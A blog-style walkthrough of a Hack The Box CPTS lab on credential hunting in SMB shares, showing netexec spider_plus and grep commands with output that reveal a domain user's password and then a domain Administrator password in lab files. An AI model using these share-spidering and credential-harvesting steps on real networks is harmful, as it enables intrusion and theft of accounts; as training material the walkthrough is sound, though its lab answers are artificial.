### CPTS / HTB Penetration Tester Path <br>
### Password Attacks: Credential Hunting in Network Shares <br>
<mark>hook it up with a follow if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

IP: 10.129.154.247

Use the credentials `mendres:Inlanefreight2025!` to connect to the target either by RDP or WinRM, then use the tools and techniques taught in this section to answer the questions below. For your convenience, `Snaffler` and `PowerHuntShares` can be found in `C:\Users\Public`.

---

### Question 1:
One of the shares mendres has access to contains valid credentials of another domain user. What is their password?

RDPizzle:
```diff
+ $ xfreerdp /v:10.129.154.247 /u:mendres /p:Inlanefreight2025!
```

Looking around in explorer, we can see a ton of shares. When I ran snaffler on the box, we saw paths to all of them. But after reading through a few articles on this type of attack, it looks like netexec, namely the spider_plus module seems to be just as comprehensive with less false positives. We can also use it to download this data for offline inspection. Let's give it a whirl on the attack box:
```diff
+ $ nxc smb 10.129.154.247 -u mendres -p Inlanefreight2025! -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60
```

	SMB         10.129.154.247  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
	SMB         10.129.154.247  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
	SPIDER_PLUS 10.129.154.247  445    DC01             [*] Started module spidering_plus with the following options:
	SPIDER_PLUS 10.129.154.247  445    DC01             [*]  DOWNLOAD_FLAG: True
	SPIDER_PLUS 10.129.154.247  445    DC01             [*]     STATS_FLAG: True
	SPIDER_PLUS 10.129.154.247  445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
	SPIDER_PLUS 10.129.154.247  445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
	SPIDER_PLUS 10.129.154.247  445    DC01             [*]  MAX_FILE_SIZE: 50 KB
	SPIDER_PLUS 10.129.154.247  445    DC01             [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
	SMB         10.129.154.247  445    DC01             [*] Enumerated shares
	SMB         10.129.154.247  445    DC01             Share           Permissions     Remark
	SMB         10.129.154.247  445    DC01             -----           -----------     ------
	SMB         10.129.154.247  445    DC01             ADMIN$                          Remote Admin
	SMB         10.129.154.247  445    DC01             C$                              Default share
	SMB         10.129.154.247  445    DC01             Company         READ            
	SMB         10.129.154.247  445    DC01             Finance                         
	SMB         10.129.154.247  445    DC01             HR              READ            
	SMB         10.129.154.247  445    DC01             IPC$            READ            Remote IPC
	SMB         10.129.154.247  445    DC01             IT              READ            
	SMB         10.129.154.247  445    DC01             Marketing                       
	SMB         10.129.154.247  445    DC01             NETLOGON        READ            Logon server share 
	SMB         10.129.154.247  445    DC01             Sales                           
	SMB         10.129.154.247  445    DC01             SYSVOL          READ            Logon server share 

Nice, looks like we have read access to Company, HR and IT, and they're now downloaded to our box. If we grep 'inlanefreight' in this dir, we get a match:
```diff
+ $ grep -ir "INLANEFREIGHT" .
```

	./IT/Tools/split_tunnel.txt:# Auth backup password: INLANEFREIGHT\jbader:ILovePower333###

🚩 found **ILovePow--edit--er333###**.

---

### Question 2:
As this user, search through the additional shares they have access to and identify the password of a domain administrator. What is it?

Lets redo the share download, but as jbader. They may have read access to some of those sweet sweet shares we were locked out of as mendres:
```diff
+ $ nxc smb 10.129.154.247 -u jbader -p ILovePower333### -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60
```

Give it 5 mins to cook. Now lets grep once more, and look for the string 'domain'. If you're using grep instead of ripgrep, make sure to tick -r for recursively, and tick -i for case-insensitivity:
```diff
+ $ grep -ir "domain"
```

	SNIP
	
	./HR/Confidential/Onboarding_Docs_132.txt:[✔] Domain Admin Rights Applied  
	./HR/Confidential/Onboarding_Docs_132.txt:Jordan will be responsible for oversight of Active Directory replication, GPO management, and DC patching. Temporarily granted access to the domain administrator account for initial 90 days to complete infrastructure tasks related to the Chicago DC migration.

Lets cat that juicy looking file!
```diff
+ $ cat ./HR/Confidential/Onboarding_Docs_132.txt
```

	========================================
	Employee Onboarding Checklist
	========================================
	
	Name: Josh Bader  
	Start Date: 2025-04-29  
	Department: IT Infrastructure  
	Manager: R. Lawson  
	Title: Systems Engineer III  
	Role Level: Tier-0 Admin  
	
	Checklist:
	[✔] AD Account Created  
	[✔] Email Provisioned  
	[✔] Assigned to Admin VPN Group  
	[✔] Azure Admin Portal Access  
	[✔] Exchange Online Admin  
	[✔] Domain Admin Rights Applied  
	
	Notes:
	Jordan will be responsible for oversight of Active Directory replication, GPO management, and DC patching. Temporarily granted access to the domain administrator account for initial 90 days to complete infrastructure tasks related to the Chicago DC migration.
	
	Account credentials
	**Username:** `Administrator`  
	**Password:** `Str0ng_Adm1nistrat0r_P@ssword_2025!`  
	
	Note: Update account group membership after probationary period. Audit required every 30 days.
	
	Action Items:
	- Schedule orientation w/ Infosec (B. Chen)
	- Issue YubiKey (Asset #YK-78218)
	- Complete privileged access training (SecOps LMS)
	
	-- Document Created by R.Lawson on 2025-04-28

🚩 found **Str0ng_Adm1nistrat0r--edit--_P@ssword_2025!**.
